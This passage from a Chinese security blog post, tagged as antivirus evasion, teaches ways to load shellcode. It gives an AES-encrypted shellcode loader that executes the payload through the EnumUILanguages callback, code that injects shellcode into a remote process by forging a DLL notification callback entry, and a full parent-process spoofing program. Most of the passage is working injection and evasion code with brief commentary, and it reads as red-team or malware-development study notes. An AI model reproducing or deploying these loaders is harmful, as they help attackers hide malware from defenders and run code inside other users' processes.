<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/%E5%88%A9%E7%94%A8dll%E9%80%9A%E7%9F%A5%E5%9B%9E%E8%B0%83%E5%8A%A0%E8%BD%BDshellcode/96d5e7c419154535a8f26fdbeee54fef.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/%E5%88%A9%E7%94%A8dll%E9%80%9A%E7%9F%A5%E5%9B%9E%E8%B0%83%E5%8A%A0%E8%BD%BDshellcode/508bcaf7563b2ec46f385d926315e21a.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/%E5%88%A9%E7%94%A8dll%E9%80%9A%E7%9F%A5%E5%9B%9E%E8%B0%83%E5%8A%A0%E8%BD%BDshellcode/349079657a78fa90b3adaea76b12de53.png"></p>
<h1 id="aes加密shellcode"><a href="#aes加密shellcode" class="headerlink" title="aes加密shellcode"></a>aes加密shellcode</h1><p><em>注意python3这里使用</em><code>Crypto</code>函数库有点坑，最简单的解决办法就是确保已经卸载<code>crypto</code>和<code>pycrypto</code>，然后安装&#96;pycryptodome。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> AES  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> Cryptodome.Util.Padding <span class="keyword">import</span> pad  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 声明变量  </span></span><br><span class="line">  </span><br><span class="line">code = <span class="string">b&#x27;Hello, world!&#x27;</span> <span class="comment"># 待加密的数据  </span></span><br><span class="line">  </span><br><span class="line">key = <span class="string">b&#x27;0123456789abcdef&#x27;</span> <span class="comment"># 加密密钥，必须为16字节  </span></span><br><span class="line">  </span><br><span class="line">iv = <span class="string">b&#x27;0123456789abcdef&#x27;</span> <span class="comment"># 加密向量，必须为16字节  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 创建 AES 加密器  </span></span><br><span class="line">  </span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 对数据进行填充  </span></span><br><span class="line">  </span><br><span class="line">padded_data = pad(code, AES.block_size)  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 加密数据  </span></span><br><span class="line">  </span><br><span class="line">encrypt = cipher.encrypt(padded_data)  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 将加密结果转换为 Base64 格式  </span></span><br><span class="line">  </span><br><span class="line">base64_encrypt = base64.b64encode(encrypt).decode()  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 显示加密结果  </span></span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;加密结果（Base64）：&#x27;</span>, base64_encrypt)</span><br></pre></td></tr></table></figure>
<p>解密直接使用现有的项目</p>
<p><a target="_blank" rel="noopener" href="https://github.com/kokke/tiny-AES-c">https://github.com/kokke/tiny-AES-c</a></p>
<p>解密demo</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">   <span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;aes.hpp&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> shellcode[] = <span class="string">&quot;\x9c\x0e\x92\x36\x7e&quot;</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> key[] = <span class="string">&quot;28T4BN6Z5EtPSF15&quot;</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> iv[] = <span class="string">&quot;ukGlewQtQJoYAQjU&quot;</span>;</span><br><span class="line">	<span class="comment">// 声明aes 结构体</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">AES_ctx</span> <span class="title">ctx</span>;</span></span><br><span class="line">	<span class="comment">// 初始化</span></span><br><span class="line">	AES_init_ctx_iv(&amp;ctx, key, iv);</span><br><span class="line">	<span class="comment">// 解密,解密后的内容依然存在code对应内存处</span></span><br><span class="line">	AES_CBC_decrypt_buffer(&amp;ctx, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">	DWORD dwOldPro = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// 更改解密后的shellcode所在内存区域的保护属性，改为可读可写可执行</span></span><br><span class="line">	BOOL ifExec = VirtualProtect(shellcode, <span class="keyword">sizeof</span>(shellcode), PAGE_EXECUTE_READWRITE, &amp;dwOldPro);</span><br><span class="line">	<span class="comment">// 回调函数执行解密后的shellcode</span></span><br><span class="line">	EnumUILanguages((UILANGUAGE_ENUMPROC)(<span class="type">char</span>*)shellcode, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Open handle to remote process</span></span><br><span class="line">HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, <span class="number">2756</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Got handle to remote process\n&quot;</span>);</span><br><span class="line">/ 在远程进程中为我们的 shellcode 分配内存</span><br><span class="line">    LPVOID shellcodeEx = VirtualAllocEx(hProc, <span class="number">0</span>, <span class="keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Allocated memory for shellcode in remote process: 0x%p\n&quot;</span>, shellcodeEx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将shellcode写入远程进程中</span></span><br><span class="line">    WriteProcessMemory(hProc, shellcodeEx, shellcode, <span class="keyword">sizeof</span>(shellcode), nullptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Shellcode has been written to remote process: 0x%p\n&quot;</span>, shellcodeEx);</span><br><span class="line"><span class="comment">// 创建一个新的LDR_DLL_NOTIFICATION_ENTRY条目</span></span><br><span class="line">LDR_DLL_NOTIFICATION_ENTRY newEntry = &#123;&#125;;</span><br><span class="line">newEntry.Context = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置 Callback 属性指向 shellcode</span></span><br><span class="line">newEntry.Callback = (PLDR_DLL_NOTIFICATION_FUNCTION)shellcodeEx;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 希望新条目成为列表中的第一个，所以新条目的List.Blink属性应该指向列表的头部</span></span><br><span class="line">newEntry.List.Blink = (PLIST_ENTRY)remoteHeadAddress;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为LDR_DLL_NOTIFICATION_ENTRY分配内存缓冲区</span></span><br><span class="line">BYTE* remoteHeadEntry = (BYTE*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LDR_DLL_NOTIFICATION_ENTRY));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从远程进程读取头条目</span></span><br><span class="line">ReadProcessMemory(hProc, remoteHeadAddress, remoteHeadEntry, <span class="keyword">sizeof</span>(LDR_DLL_NOTIFICATION_ENTRY), nullptr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置新条目的 List.Flink 属性为指向list中原来第一个条目</span></span><br><span class="line">newEntry.List.Flink = ((PLDR_DLL_NOTIFICATION_ENTRY)remoteHeadEntry)-&gt;List.Flink;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 分配内存空间</span></span><br><span class="line">LPVOID newEntryAddress = VirtualAllocEx(hProc, <span class="number">0</span>, <span class="keyword">sizeof</span>(LDR_DLL_NOTIFICATION_ENTRY), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Allocated memory for new entry in remote process: 0x%p\n&quot;</span>, newEntryAddress);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将新条目写入远程进程中</span></span><br><span class="line">WriteProcessMemory(hProc, (BYTE*)newEntryAddress, &amp;newEntry, <span class="keyword">sizeof</span>(LDR_DLL_NOTIFICATION_ENTRY), nullptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] New Entrty has been written to remote process: 0x%p\n&quot;</span>, newEntryAddress);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="父进程欺骗"><a href="#父进程欺骗" class="headerlink" title="父进程欺骗"></a>父进程欺骗</h1><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/%E5%88%A9%E7%94%A8dll%E9%80%9A%E7%9F%A5%E5%9B%9E%E8%B0%83%E5%8A%A0%E8%BD%BDshellcode/fdba40b521ffd1ad131cc1c9c91d1d11.png"></p>
<ol>
<li><strong>打开父进程</strong>：使用 <code>OpenProcess</code> 打开您希望设置为父进程的进程，并获取其句柄。</li>
<li><strong>准备启动信息</strong>：使用 <code>STARTUPINFOEX</code> 结构，设置其 <code>lpAttributeList</code> 指向一个包含父进程句柄的线程属性列表。</li>
<li><strong>创建属性列表</strong>：使用 <code>InitializeProcThreadAttributeList</code> 和 <code>UpdateProcThreadAttribute</code> 函数来初始化和更新这个属性列表，以指定父进程。</li>
<li><strong>创建新进程</strong>：使用 <code>CreateProcess</code> 函数，并传入上面准备好的启动信息，从而创建新进程</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span>  </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="comment">// 打开自定义的父进程（假设父进程 ID 为 4460）  </span></span><br><span class="line">    HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, <span class="number">4460</span>);  </span><br><span class="line">    <span class="keyword">if</span> (parentProcessHandle == <span class="literal">NULL</span>) &#123;  </span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;[-] Failed to open parent process: &quot;</span> &lt;&lt; GetLastError() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Got handle to parent process\n&quot;</span>;  </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置启动信息和进程信息  </span></span><br><span class="line">    STARTUPINFOEXA si;  </span><br><span class="line">    PROCESS_INFORMATION pi;  </span><br><span class="line">    SIZE_T attributeSize;  </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 STARTUPINFOEXA  </span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;si, <span class="number">0</span>, <span class="keyword">sizeof</span>(STARTUPINFOEXA));  </span><br><span class="line">    si.StartupInfo.cb = <span class="keyword">sizeof</span>(STARTUPINFOEXA);  </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化进程线程属性列表  </span></span><br><span class="line">    InitializeProcThreadAttributeList(<span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>, &amp;attributeSize);  </span><br><span class="line">    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), <span class="number">0</span>, attributeSize);  </span><br><span class="line">    InitializeProcThreadAttributeList(si.lpAttributeList, <span class="number">1</span>, <span class="number">0</span>, &amp;attributeSize);  </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 更新父进程属性  </span></span><br><span class="line">    UpdateProcThreadAttribute(si.lpAttributeList, <span class="number">0</span>, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;parentProcessHandle, <span class="keyword">sizeof</span>(HANDLE), <span class="literal">NULL</span>, <span class="literal">NULL</span>);  </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建新进程（例如，Notepad）  </span></span><br><span class="line">    <span class="keyword">if</span> (!CreateProcessA(<span class="string">&quot;C:\\Windows\\System32\\notepad.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si.StartupInfo, &amp;pi)) &#123;  </span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;[-] CreateProcess failed: &quot;</span> &lt;&lt; GetLastError() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Created new process with ID: &quot;</span> &lt;&lt; pi.dwProcessId &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;  </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理资源  </span></span><br><span class="line">    CloseHandle(pi.hThread);  </span><br><span class="line">    CloseHandle(pi.hProcess);  </span><br><span class="line">    CloseHandle(parentProcessHandle);  </span><br><span class="line">    HeapFree(GetProcessHeap(), <span class="number">0</span>, si.lpAttributeList);  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Kudaes/EPI">GitHub - Kudaes&#x2F;EPI：通过入口点劫持实现无线程进程注入 — GitHub - Kudaes&#x2F;EPI: Threadless Process Injection through entry point hijacking</a></p>
<p><strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zha0gongz1/p/17633377.html">玄 - 利用DLL通知回调函数注入shellcode（上） - zha0gongz1 - 博客园 (cnblogs.com)</a></strong></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://helsome.gihub.io">helson</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://helsome.gihub.io/2024/10/25/%E5%88%A9%E7%94%A8dll%E9%80%9A%E7%9F%A5%E5%9B%9E%E8%B0%83%E5%8A%A0%E8%BD%BDshellcode/">https://helsome.gihub.io/2024/10/25/%E5%88%A9%E7%94%A8dll%E9%80%9A%E7%9F%A5%E5%9B%9E%E8%B0%83%E5%8A%A0%E8%BD%BDshellcode/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://helsome.gihub.io" target="_blank">infinite</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%85%8D%E6%9D%80/">免杀</a></div><div class="post_share"><div class="social-share" data-image="/hexo-blog/source/avatar%20img.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/10/25/PE%E8%A7%A3%E6%9E%90%E5%99%A8%E7%BC%96%E5%86%99/" title="PE解析器编写"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">PE解析器编写</div></div></a></div><div class="next-post pull-right"><a href="/2024/09/23/os-cs162/" title="os cs162"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">os cs162</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/hexo-blog/source/avatar%20img.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">helson</div><div class="author-info__description">吾生有涯，其知无涯</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/helsome"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/helsome" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:huichuanh8@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text">注册自定义回调函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%BE%E5%88%B0%E9%93%BE%E8%A1%A8%E7%9A%84%E5%A4%B4%E9%83%A8"><span class="toc-number">2.</span> <span class="toc-text">找到链表的头部</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E5%86%99%E4%BB%A3%E7%A0%81%E6%93%8D%E7%BA%B5%E7%9B%AE%E6%A0%87%E8%BF%9B%E7%A8%8B%E5%86%85%E5%AD%98%E6%89%A7%E8%A1%8Cshellcode"><span class="toc-number">3.</span> <span class="toc-text">编写代码操纵目标进程内存执行shellcode</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#aes%E5%8A%A0%E5%AF%86shellcode"><span class="toc-number"></span> <span class="toc-text">aes加密shellcode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%88%B6%E8%BF%9B%E7%A8%8B%E6%AC%BA%E9%AA%97"><span class="toc-number"></span> <span class="toc-text">父进程欺骗</span></a></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/25/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/" title="brute ratel C4 badger全分析文档">brute ratel C4 badger全分析文档</a><time datetime="2024-10-25T11:37:08.000Z" title="发表于 2024-10-25 19:37:08">2024-10-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/25/PE%E8%A7%A3%E6%9E%90%E5%99%A8%E7%BC%96%E5%86%99/" title="PE解析器编写">PE解析器编写</a><time datetime="2024-10-25T11:29:28.000Z" title="发表于 2024-10-25 19:29:28">2024-10-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/25/%E5%88%A9%E7%94%A8dll%E9%80%9A%E7%9F%A5%E5%9B%9E%E8%B0%83%E5%8A%A0%E8%BD%BDshellcode/" title="利用dll通知回调加载shellcode">利用dll通知回调加载shellcode</a><time datetime="2024-10-25T10:50:38.000Z" title="发表于 2024-10-25 18:50:38">2024-10-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/23/os-cs162/" title="os cs162">os cs162</a><time datetime="2024-09-23T11:00:34.000Z" title="发表于 2024-09-23 19:00:34">2024-09-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/08/wannacry/" title="wannacry勒索病毒加密解密过程分析">wannacry勒索病毒加密解密过程分析</a><time datetime="2024-07-08T09:46:32.000Z" title="发表于 2024-07-08 17:46:32">2024-07-08</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By helson</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>